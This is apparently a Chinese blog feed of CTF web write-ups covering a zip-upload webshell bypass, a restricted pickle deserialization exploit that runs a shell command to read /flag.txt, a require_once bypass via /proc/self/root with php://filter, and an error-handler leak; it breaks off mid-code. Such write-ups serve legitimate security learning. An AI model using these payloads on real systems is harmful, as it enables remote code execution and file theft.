    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没想到真有战队要我这种大fw呜呜呜呜呜，考试考完后复现了之前比赛没来得及复现的题目</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezip"><a href="#ezip" class="headerlink" title="ezip"></a>ezip</h3><p>文件上传的界面，下面有张色图并写着“sit donw look look se tu”<br>在图片结尾有base64之后的源码<br>upload.php:</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>error_reporting(<span class="hljs-number">0</span>);<br>include(<span class="hljs-string">&quot;zip.php&quot;</span>);<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;..&quot;</span>)||strstr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;/&quot;</span>))&#123;      <span class="hljs-regexp">//</span>检验../防止目录穿越<br>        echo <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(pathinfo(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)!=<span class="hljs-string">&quot;zip&quot;</span>)&#123;       <span class="hljs-regexp">//</span>检查后缀要为zip<br>        echo <span class="hljs-string">&quot;only zip!!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    <span class="hljs-variable">$Myzip</span> = new zip(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    mkdir(<span class="hljs-variable">$Myzip</span>-&gt;path);<br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;./&#x27;</span>.<span class="hljs-variable">$Myzip</span>-&gt;path.<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    echo <span class="hljs-string">&quot;Try to unzip your zip to /&quot;</span>.<span class="hljs-variable">$Myzip</span>-&gt;path.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Myzip</span>-&gt;unzip())&#123;echo <span class="hljs-string">&quot;Success&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;echo <span class="hljs-string">&quot;failed&quot;</span>;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>zip.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zip</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zip_name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zip_manager</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$zip_name</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;zip_manager = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;path = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">gen_path</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;zip_name = <span class="hljs-variable">$zip_name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_path</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$chars</span>=<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br>        <span class="hljs-variable">$newchars</span>=<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$chars</span>);<br>        <span class="hljs-title function_ invoke__">shuffle</span>(<span class="hljs-variable">$newchars</span>);<br>        <span class="hljs-variable">$chars_key</span>=<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-variable">$newchars</span>,<span class="hljs-number">15</span>);<br>        <span class="hljs-variable">$fnstr</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">15</span>;<span class="hljs-variable">$i</span>++)&#123;<br>            <span class="hljs-variable">$fnstr</span>.=<span class="hljs-variable">$newchars</span>[<span class="hljs-variable">$chars_key</span>[<span class="hljs-variable">$i</span>]];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$fnstr</span>.<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">microtime</span>()*<span class="hljs-number">100000</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deldir</span>(<span class="hljs-params"><span class="hljs-variable">$dir</span></span>) </span>&#123;<br>        <span class="hljs-comment">//先删除目录下的文件：</span><br>        <span class="hljs-variable">$dh</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$dir</span>);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$dh</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span>!=<span class="hljs-string">&quot;..&quot;</span>) &#123;<br>                <span class="hljs-variable">$fullpath</span> = <span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$fullpath</span>)) &#123;<br>                    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$fullpath</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">deldir</span>(<span class="hljs-variable">$fullpath</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$dh</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dir_list</span>(<span class="hljs-params"><span class="hljs-variable">$directory</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$array</span> = [];<br><br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dir</span>(<span class="hljs-variable">$directory</span>);<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$file</span> = <span class="hljs-variable">$dir</span>-&gt;<span class="hljs-title function_ invoke__">read</span>()) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$file</span> !== <span class="hljs-string">&#x27;..&#x27;</span>) &#123;<br>                <span class="hljs-variable">$array</span>[] = <span class="hljs-variable">$file</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$array</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unzip</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$fullpath</span> = <span class="hljs-string">&quot;/var/www/html/&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;zip_name;<br>        <span class="hljs-variable">$white_list</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;bmp&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;zip_manager-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$fullpath</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-variable language_">$this</span>-&gt;zip_manager-&gt;<span class="hljs-title function_ invoke__">count</span>();<span class="hljs-variable">$i</span> ++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable language_">$this</span>-&gt;zip_manager-&gt;<span class="hljs-title function_ invoke__">getNameIndex</span>(<span class="hljs-variable">$i</span>),<span class="hljs-string">&quot;../&quot;</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you bad bad&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">$this</span>-&gt;zip_manager-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-variable language_">$this</span>-&gt;path))&#123;       <span class="hljs-comment">//漏洞利用处</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Unzip to /&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-string">&quot;/ failed&quot;</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$fullpath</span>);<br>        <span class="hljs-variable">$file_list</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dir_list</span>(<span class="hljs-string">&quot;/var/www/html/&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$file_list</span>);<span class="hljs-variable">$i</span>++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file_list</span>[<span class="hljs-variable">$i</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;dir? I deleted all things in it&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;@<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">deldir</span>(<span class="hljs-string">&quot;/var/www/html/&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file_list</span>[<span class="hljs-variable">$i</span>]);@<span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-string">&quot;/var/www/html/&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file_list</span>[<span class="hljs-variable">$i</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_list</span>[<span class="hljs-variable">$i</span>], PATHINFO_EXTENSION),<span class="hljs-variable">$white_list</span>)) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;only image!!! I deleted it for you&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;/var/www/html/&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;path.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file_list</span>[<span class="hljs-variable">$i</span>]);&#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>漏洞在于：zip.php中用ZipArchive类对压缩包进行解压，zip解压时如果失败，会<code>echo &quot;Unzip to /&quot;.$this-&gt;path.&quot;/ failed&quot;</code><br>但是之后就直接exit结束程序了，没有考虑解压失败但仍解压出一些文件需要删除</p><p>所以关键在于如何构建一个解压报错但仍能解压出木马的压缩包：</p><p>方法一：<br>p牛在2014年的<a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">phpcms漏洞</a>里就利用到了<br>在今年的知识星球里也提到了ZipArchive类报错的<a href="https://t.zsxq.com/04NjIemai">简单方法</a>：修改文件名</p><p>由于linux里不支持文件名中有&#x2F;，所以把一个木马和一个其他文件压到压缩包，再用010把其他文件的文件名改为&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;之类<br><img src="http://81.70.101.23:11111/i/2022/07/16/saay4m_0.png"><br>用kali实验一下，可以看到报错但是php还是解压出来了<br><img src="http://81.70.101.23:11111/i/2022/07/16/saazob_0.png"><br>上传并测试连接，显示unzip failed<br><img src="http://81.70.101.23:11111/i/2022/07/16/sab1ji_0.png"><br>但是尝试用蚁剑连接，成功，说明木马已经解压出来<br><img src="http://81.70.101.23:11111/i/2022/07/16/sab287_0.png"><br>并且看一下目录，有上传的zip和解压一半的文件<br><img src="http://81.70.101.23:11111/i/2022/07/16/saazwg_0.png"></p><p>方法二：<br>文件系统不允许有重名的文件，或者文件和文件夹重名<br>但在zip里可以有重名的文件和文件夹，所以构建一个这样的压缩包(名字无所谓，里面有一个木马和一个木马同名的文件夹)<br><img src="http://81.70.101.23:11111/i/2022/07/16/sdeioi_0.png"><br>上传压缩包同样显示failed但是也能连接木马（就不演示图片了）</p><h3 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h3><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> config<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;config&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[module], name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    base_dir = os.path.dirname(__file__)<br>    resp = make_response(<span class="hljs-built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="hljs-built_in">open</span>(os.path.join(base_dir, <span class="hljs-string">&quot;config/__init__.py&quot;</span>)).read())<br>    resp.headers[<span class="hljs-string">&quot;Content-type&quot;</span>] = <span class="hljs-string">&quot;text/plain;charset=UTF-8&quot;</span><br>    <span class="hljs-keyword">return</span> resp<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/home&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    data=request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br>    User = restricted_loads(base64.b64decode(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(User)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">True</span>, port=<span class="hljs-number">5000</span>)<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-comment"># 这里我也改了一下</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(cmd,<span class="hljs-built_in">list</span>) :<br>        s=<span class="hljs-string">&#x27;&#x27;</span>.join(cmd)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!!!!!!!!!&quot;</span>)<br>        s=<span class="hljs-built_in">eval</span>(s)<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;??????&quot;</span>)<br></code></pre></td></tr></table></figure><p>从unpickling能猜出这题要用pickle反序列化，关键在于构造opcode<br>RestrictedUnpickler类规定了只能利用config类，其中显然只有backdoor函数可以利用</p><p>构造opcode可以手动构造或者选择借助<a href="https://github.com/eddieivan01/pker">pker自动构造</a></p><p>以pker构造为例，在pker项目的test文件夹下新建middle.txt，内容为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">middle=<span class="hljs-built_in">GLOBAL</span>(<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;backdoor&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">middle</span><span class="hljs-params">([<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&quot;</span>])</span></span><br>return<br></code></pre></td></tr></table></figure><p>然后python3 pker.py &lt; test&#x2F;middle.txt<br>将生成的opcode进行base64加密<br><img src="http://81.70.101.23:11111/i/2022/07/20/w82fu1_0.png"></p><p>在靶机的&#x2F;home进行post发包即可<br><img src="http://81.70.101.23:11111/i/2022/07/20/w8fqa9_0.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3-520招新赛</title>
    <link href="/2022/05/31/Dest0g3-520%E6%8B%9B%E6%96%B0%E8%B5%9B/"/>
    <url>/2022/05/31/Dest0g3-520%E6%8B%9B%E6%96%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想加个战队没想到太废了，继续学习…</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="phpdest-Solved"><a href="#phpdest-Solved" class="headerlink" title="phpdest(Solved)"></a>phpdest(Solved)</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>我当时是用了日志包含的方法，日志文件位置：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br><img src="http://81.70.101.23:11111/i/2022/05/31/oufev4_0.png"></p><p>然后这次又学到了一个新方法和里面的知识点<br>当直接传入<code>?file=flag.php</code>或者<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code>并没有回显</p><p>这是因为在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含，而且这个路径下的文件都不能被包含<br>比如先include&#x2F;require&#x2F;require_once后，再require_once就不会成功。但如果用include就不考虑之前有没有被包含过</p><p>从原理来说，php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(‘flag.php’)，已经include的文件不可以再进行require_once放入哈希表中。</p><p>如何绕过这个哈希表：让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</p><p>在这里有个小知识点，&#x2F;proc&#x2F;self指向当前进程的&#x2F;proc&#x2F;pid&#x2F;，&#x2F;proc&#x2F;self&#x2F;root&#x2F;是指向&#x2F;的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:<code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p><p><img src="http://81.70.101.23:11111/i/2022/05/31/oufjfa_0.png"></p><h3 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fl4g.php&quot;</span>;<br><span class="hljs-variable">$dest0g3</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-variable">$timme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>);<br><span class="hljs-variable">$timmme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;i&quot;</span>);<br><span class="hljs-keyword">if</span>((<span class="hljs-variable">$time</span> &gt; <span class="hljs-string">&quot;24&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timme</span> &gt; <span class="hljs-string">&quot;31&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timmme</span> &gt; <span class="hljs-string">&quot;60&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fl4g</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try harder!&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<br>    <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">use</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$fl4g</span></span>) </span>&#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-variable">$fl4g</span>;<br>    &#125;<br>);<br><span class="hljs-variable">$fl4g</span> .= <span class="hljs-variable">$dest0g3</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>date(“H”)是小时，取值不会大于24<br>date(“d”)是一月天数，取值不会大于31<br>date(“i”)是分钟，取值不会大于60</p><p>所以第一个if判断肯定达不到</p><p>审计后边的代码，最后一行代码有个.&#x3D;，就是在$fl4g &#x3D; $fl4g+$dest0g3<br>如果传入数组，不能和原来的字符串相拼接，就会报错，调用set_error_handler，再调用里里面的fuction输出$fl4g<br><img src="http://81.70.101.23:11111/i/2022/05/31/p839d3_0.png"></p><h3 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$aaa</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>];<br><span class="hljs-variable">$black_list</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;^&#x27;</span>,<span 